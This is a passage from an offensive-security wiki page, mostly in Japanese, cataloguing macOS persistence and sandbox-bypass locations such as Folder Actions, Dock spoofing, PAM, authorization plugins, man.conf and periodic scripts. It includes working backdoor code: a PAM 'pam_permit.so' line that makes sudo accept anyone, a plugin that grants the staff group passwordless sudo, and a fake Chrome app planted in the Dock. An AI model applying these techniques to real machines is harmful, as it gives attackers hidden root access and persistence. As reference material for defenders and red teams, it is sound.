- `019bdcd2` - 時刻（16進数）。これは epoch から経過した分数を表します。`0x019bdcd2` は10進数で `26991826` です。これに60を掛けると `1619509560` になり、`GMT: 2021. April 27., Tuesday 7:46:00` となります。

ジョブファイルを出力すると、`at -c` で得たのと同じ情報が含まれていることがわかります。

### フォルダアクション (Folder Actions)

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- サンドボックスの回避に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Folder Actions を設定するには引数付きで `osascript` を呼び出し、**`System Events`** に連絡できる必要がある
- TCC 回避: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents and Downloads のような基本的な TCC 権限を持っている

#### 場所

- **`/Library/Scripts/Folder Action Scripts`**
- Root 権限が必要
- **Trigger**: 指定フォルダへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: 指定フォルダへのアクセス

#### 説明と悪用

Folder Actions は、フォルダ内の項目の追加・削除、フォルダウィンドウの開閉やサイズ変更などの変化によって自動的にトリガーされるスクリプトです。これらのアクションは様々なタスクに利用でき、Finder UI やターミナルコマンドなど、異なる方法でトリガーできます。

Folder Actions を設定する方法としては、例えば次のようなオプションがあります:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) を使って Folder Action ワークフローを作成し、サービスとしてインストールする。
2. フォルダのコンテキストメニューにある Folder Actions Setup からスクリプトを手動で添付する。
3. OSAScript を利用して Apple Event メッセージを `System Events.app` に送信し、プログラムで Folder Action を設定する。
- この方法はアクションをシステムに埋め込み、ある程度の永続性を持たせるのに特に有用です。

以下のスクリプトは、Folder Action によって実行され得る例です:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
上記のスクリプトを Folder Actions で使用できるようにするには、次のコマンドでコンパイルしてください:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトをコンパイルしたら、以下のスクリプトを実行して Folder Actions を設定します。このスクリプトは Folder Actions をグローバルに有効化し、先にコンパイルしたスクリプトを Desktop フォルダに紐付けます。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
次のコマンドでセットアップスクリプトを実行します:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- これは GUI を介してこの persistence を実装する方法です:

これが実行されるスクリプトです:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
次のコマンドでコンパイルします: `osacompile -l JavaScript -o folder.scpt source.js`

次の場所へ移動します:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup` app を開き、**監視したいフォルダ**を選択し、今回の場合は **`folder.scpt`**（私の場合は output2.scp と名付けました）を選択します:

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

そのフォルダを **Finder** で開くと、スクリプトが実行されます。

この設定は base64 形式で **plist** に保存され、場所は **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** です。

では、GUI アクセスなしでこの永続化を準備してみます:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist` をコピー**してバックアップを `/tmp` に保存します:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 設定した Folder Actions を**削除**します:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

これで環境が空になりました

3. バックアップファイルをコピー: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を読み込むために Folder Actions Setup.app を開きます: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> ただし私の環境では動作しませんでしたが、これは writeup の手順です:(

### Dock ショートカット

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- sandbox を回避するのに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、システム内に悪意のあるアプリケーションをインストールしておく必要があります
- TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: ユーザーが Dock 内のアプリをクリックしたとき

#### 説明と悪用

Dock に表示されるすべてのアプリケーションは plist 内に指定されています: **`~/Library/Preferences/com.apple.dock.plist`**

次のようにして**アプリケーションを追加**できます:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
いくつかの**social engineering**を使うと、Dock内で**例えばGoogle Chromeを偽装して**、実際に自分のスクリプトを実行できます:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### カラーピッカー

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- sandboxのバイパスに有用: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に特定のアクションが必要
- 別のsandboxに入ることになる
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/Library/ColorPickers`
- Root権限が必要
- トリガー: カラーピッカーを使用
- `~/Library/ColorPickers`
- トリガー: カラーピッカーを使用

#### 説明とエクスプロイト

**カラーピッカーのbundleをコンパイル**してあなたのコードを組み込み（[**this one for example**](https://github.com/viktorstrate/color-picker-plus)を例に使える）、コンストラクタを追加（[Screen Saver section](macos-auto-start-locations.md#screen-saver)のように）し、バンドルを`~/Library/ColorPickers`にコピーします。

その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。

ライブラリをロードするバイナリは**非常に制限の厳しい sandbox**を持っていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Useful to bypass sandbox: **いいえ。独自のアプリを実行する必要があるため**
- TCC bypass: ???

#### 配置場所

- 特定のアプリ

#### 説明 & Exploit

Finder Sync Extension を含むアプリの例は [**こちら**](https://github.com/D00MFist/InSync) にあります。

アプリケーションは `Finder Sync Extensions` を持つことができます。この extension は実行されるアプリケーション内に組み込まれます。さらに、この extension がコードを実行するには、有効な Apple Developer 証明書で**署名されている必要があり**、**sandboxed**（ただし緩和された例外を追加できる場合があります）である必要があり、次のようなもので登録されている必要があります:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- sandbox をバイパスするのに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、一般的なアプリケーションの sandbox 内で実行されます
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

- `/System/Library/Screen Savers`
- root 権限が必要
- **トリガー**: スクリーンセーバーを選択
- `/Library/Screen Savers`
- root 権限が必要
- **トリガー**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
- **トリガー**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明とエクスプロイト

Xcode で新しいプロジェクトを作成し、テンプレートから新しい **スクリーンセーバー** を生成します。次に、そこにコードを追加します。例えば以下のコードはログを生成します。

**ビルド**して、`.saver` バンドルを **`~/Library/Screen Savers`** にコピーします。次にスクリーンセーバーの GUI を開き、それをクリックすると大量のログが生成されるはずです：
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> このコードをロードするバイナリの entitlements（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）内に **`com.apple.security.app-sandbox`** が含まれているため、あなたは **inside the common application sandbox** に入ります。

Saver コード:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight プラグイン

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- サンドボックス回避に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし最終的に application サンドボックスに入る
- TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)
- サンドボックスは非常に制限されているように見える

#### Location

- `~/Library/Spotlight/`
- **Trigger**: spotlight プラグインで管理されている拡張子を持つ新しいファイルが作成されると発動
- `/Library/Spotlight/`
- **Trigger**: spotlight プラグインで管理されている拡張子を持つ新しいファイルが作成されると発動
- Root required
- `/System/Library/Spotlight/`
- **Trigger**: spotlight プラグインで管理されている拡張子を持つ新しいファイルが作成されると発動
- Root required
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: spotlight プラグインで管理されている拡張子を持つ新しいファイルが作成されると発動
- New app required

#### Description & Exploitation

Spotlight は macOS に組み込まれた検索機能で、ユーザーがコンピュータ上のデータに対して**迅速かつ包括的にアクセスできる**よう設計されています.\
この迅速な検索機能を実現するために、Spotlight は**専有データベース**を維持し、ほとんどのファイルを**パースしてインデックスを作成**することで、ファイル名とその内容の両方を素早く検索できるようにしています。

Spotlight の基礎となる仕組みは 'mds' という中央プロセスで、これは**メタデータサーバー**を意味します。このプロセスが Spotlight サービス全体を管理します。これに補助される形で複数の 'mdworker' デーモンが存在し、さまざまなメンテナンスタスク（異なるファイルタイプのインデックス作成など）を実行します（`ps -ef | grep mdworker`）。これらのタスクは Spotlight importer plugins、つまり **".mdimporter bundles"** によって可能になり、Spotlight が多様なファイル形式の内容を理解してインデックス化できるようにします。

これらのプラグイン（`.mdimporter` バンドル）は前述の場所に配置され、新しいバンドルが現れると数分以内にロードされます（サービスの再起動は不要）。これらのバンドルはどの**ファイルタイプおよび拡張子を扱えるか**を示す必要があり、その結果、Spotlight は示された拡張子を持つ新しいファイルが作成されたときにそれらを使用します。

読み込まれているすべての `mdimporters` を**見つける**ことが可能です:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例えば、**/Library/Spotlight/iBooksAuthor.mdimporter** はこれらの種類のファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> もし他の `mdimporter` の Plist を確認しても、**`UTTypeConformsTo`** エントリが見つからないことがあります。これは組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、System default plugins が常に優先されるため、攻撃者がアクセスできるのは Apple's own `mdimporters` によってインデックスされていないファイルだけです。

To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.

Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**

### ~~Preference Pane~~

> [!CAUTION]
> It doesn't look like this is working anymore.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- サンドボックス回避に有用: [🟠](https://emojipedia.org/large-orange-circle)
- 特定のユーザー操作が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

It doesn't look like this is working anymore.

## Root Sandbox Bypass

> [!TIP]
> Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- サンドボックス回避に有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root 権限が必要
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root 権限が必要
- **Trigger**: 指定された時刻になると実行される
- `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
- Root 権限が必要
- **Trigger**: 指定された時刻になると実行される

#### Description & Exploitation

The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Note that scripts stored in `/etc/periodic/` are **executed** as the **owner of the file,** so this won't work for a potential privilege escalation.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
実行されるその他の定期的なスクリプトは **`/etc/defaults/periodic.conf`** に示されています:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
もし `/etc/daily.local`、`/etc/weekly.local`、`/etc/monthly.local` のいずれかのファイルを書き込めれば、それは**遅かれ早かれ実行されます**。

> [!WARNING]
> periodic script は**スクリプトの所有者として実行される**ことに注意してください。したがって、通常のユーザーがスクリプトの所有者であれば、そのユーザー権限で実行されます（これにより privilege escalation 攻撃を防げることがあります）。

### PAM

解説: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
解説: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- sandbox をバイパスするのに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root が必要です
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- 常に root が必要です

#### 説明と悪用

PAM は macOS 内での容易な実行よりも **persistence** やマルウェアの持続に重点を置いているため、本稿では詳細な説明は行いません。**この手法をよりよく理解するには、解説を読んでください**。

PAM モジュールを確認するには:
```bash
ls -l /etc/pam.d
```
PAMを悪用した persistence/privilege escalation technique は、モジュール /etc/pam.d/sudo を変更して先頭に以下の行を追加するだけで簡単に実行できます:
```bash
auth       sufficient     pam_permit.so
```
つまり、**次のようになります**：
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
そして、**`sudo` を使用しようとするどんな試みでも機能します**。

> [!CAUTION]
> このディレクトリは TCC によって保護されているため、ユーザーにアクセス許可を求めるプロンプトが表示される可能性が高いことに注意してください。

Another nice example is su, were you can see that it's also possible to give parameters to the PAM modules (and you coukd also backdoor this file):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### 認証プラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/]\  
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65]

- sandbox をバイパスするのに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root 権限が必要で、追加の設定が必要
- TCC bypass: ???

#### 場所

- `/Library/Security/SecurityAgentPlugins/`
- root 権限が必要
- プラグインを使用するには承認データベースを構成する必要がある

#### 説明と悪用

ユーザーがログインしたときに実行され、永続化を維持する認証プラグインを作成できる。作成方法の詳細は前述の writeups を参照してください（注意：不適切に作成したプラグインはログイン不能にし、リカバリモードから Mac をクリーンする必要がある場合があります）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Move** the bundle を読み込む場所に移動してください:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後にこのPluginを読み込むための**ルール**を追加してください:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`** は認可フレームワークに認可のために外部メカニズムを呼び出す必要があることを伝えます。さらに、**`privileged`** を指定すると root によって実行されます。

次のようにトリガーします:
```bash
security authorize com.asdf.asdf
```
そして、**staff グループは sudo アクセスを持っているべきです**（確認するには `/etc/sudoers` を参照してください）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- But you need to be root and the user must use man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/private/etc/man.conf`**
- Root required
- **`/private/etc/man.conf`**: Whenever man is used

#### Description & Exploit

The config file **`/private/etc/man.conf`** は、man ドキュメントを開くときに使用するバイナリ/スクリプトを指定します。したがって、実行ファイルへのパスを変更すれば、ユーザーが man でドキュメントを読むたびに backdoor が実行されるようにできます。

For example set in **`/private/etc/man.conf`**:
```
MANPAGER /tmp/view
```
次に `/tmp/view` を次のように作成します:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- Sandboxをバイパスするのに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root 権限が必要で、apache が実行中である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd は entitlements を持っていません

#### Location

- **`/etc/apache2/httpd.conf`**
- Root が必要
- Trigger: Apache2 が起動したとき

#### Description & Exploit

`/etc/apache2/httpd.conf` にモジュールをロードする行を追加して、次のように指定できます:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
この方法でコンパイルしたモジュールは Apache によって読み込まれます。  
ただし、**有効な Apple 証明書で署名する**か、システムに**新しい信頼された証明書を追加**してそれで**署名する**必要があります。

必要であれば、サーバが起動することを確認するために、次のコマンドを実行できます:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylbのコード例:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox をバイパスするのに有用: [🟠](https://emojipedia.org/large-orange-circle)
- ただし root であり、auditd が実行されていて、警告を発生させる必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
- root 権限が必要
- **Trigger**: auditd が警告を検出したとき

#### 説明 & Exploit

auditd が警告を検出すると、スクリプト **`/etc/security/audit_warn`** が **実行されます**。したがって、そこに payload を追加できます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
You could force a warning with `sudo audit -n`.

### スタートアップ項目

> [!CAUTION] > **これは非推奨であり、これらのディレクトリには何も存在しないはずです。**

The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:

1. An **rc script**: システム起動時に実行されるシェルスクリプト。
2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.

Ensure that both the rc script and the `StartupParameters.plist` file are correctly placed inside the **StartupItem** directory for the startup process to recognize and utilize them。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> このコンポーネントは私の macOS 環境では見つかりませんでした。詳細は下の writeup を確認してください

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Introduced by Apple, **emond** is a logging mechanism that seems to be underdeveloped or possibly abandoned, yet it remains accessible. While not particularly beneficial for a Mac administrator, this obscure service could serve as a subtle persistence method for threat actors, likely unnoticed by most macOS admins.

For those aware of its existence, identifying any malicious usage of **emond** is straightforward. The system's LaunchDaemon for this service seeks scripts to execute in a single directory. To inspect this, the following command can be used:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### 場所

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root 権限が必要
- **トリガー**: XQuartz 使用時

#### Description & Exploit

XQuartzは**macOSにはもはやインストールされていません**。詳細は writeup を参照してください。

### ~~kext~~

> [!CAUTION]
> kextをrootでインストールするのは非常に複雑なので、エクスプロイトがない限り、これをsandboxesからのescapeやpersistenceの手段としては考えません。

#### 場所

In order to install a KEXT as a startup item, it needs to be **installed in one of the following locations**:

- `/System/Library/Extensions`
- KEXT files built into the OS X operating system.
- `/Library/Extensions`
- KEXT files installed by 3rd party software

You can list currently loaded kext files with:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
For more information about [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### 場所

- **`/usr/local/bin/amstoold`**
- Root 権限が必要

#### 説明 & Exploitation

